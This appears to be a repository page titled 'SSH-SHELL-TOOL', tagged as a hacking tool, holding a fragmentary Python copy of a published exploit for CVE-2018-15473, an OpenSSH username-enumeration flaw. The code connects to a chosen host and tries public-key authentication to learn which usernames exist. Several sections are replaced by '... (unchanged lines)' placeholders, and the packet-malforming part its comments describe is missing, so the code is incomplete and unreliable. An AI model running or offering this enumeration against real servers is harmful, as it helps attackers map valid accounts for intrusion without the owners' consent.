# SSH-SHELL-TOOL
Bast tool #hacking

#!/usr/bin/env python

import logging  # Add this line
import argparse
import paramiko
import multiprocessing
import socket
import sys
import json
# store function we will overwrite to malform the packet
# ... (rest of your script)
# Exploit: OpenSSH 7.7 - Username Enumeration
# Author: Justin Gardner
# Date: 2018-08-20
# Software: https://ftp4.usa.openbsd.org/pub/OpenBSD/OpenSSH/openssh-7.7.tar.gz
# Affected Versions: OpenSSH version < 7.7
# CVE: CVE-2018-15473

# ... (unchanged lines)

# create custom exception
class BadUsername(Exception):
    def __init__(self):
        pass

# ... (unchanged lines)

# create function to perform authentication with malformed packet and desired username
def checkUsername(username, tried=0):
    sock = socket.socket()
    sock.connect((args.hostname, args.port))
    # instantiate transport
    transport = paramiko.transport.Transport(sock)
    try:
        transport.start_client()
    except paramiko.ssh_exception.SSHException:
        # server was likely flooded, retry up to 3 times
        transport.close()
        if tried < 4:
            tried += 1
            return checkUsername(username, tried)
        else:
            print('[-] Failed to negotiate SSH transport')
    try:
        transport.auth_publickey(username, paramiko.RSAKey.generate(1024))
    except BadUsername:
        return (username, False)
    except paramiko.ssh_exception.AuthenticationException:
        return (username, True)
    # Successful auth(?)
    raise Exception("There was an error. Is this the correct version of OpenSSH?")

# ... (unchanged lines)

# get rid of paramiko logging
logging.getLogger('paramiko.transport').addHandler(logging.NullHandler())

# ... (unchanged lines)
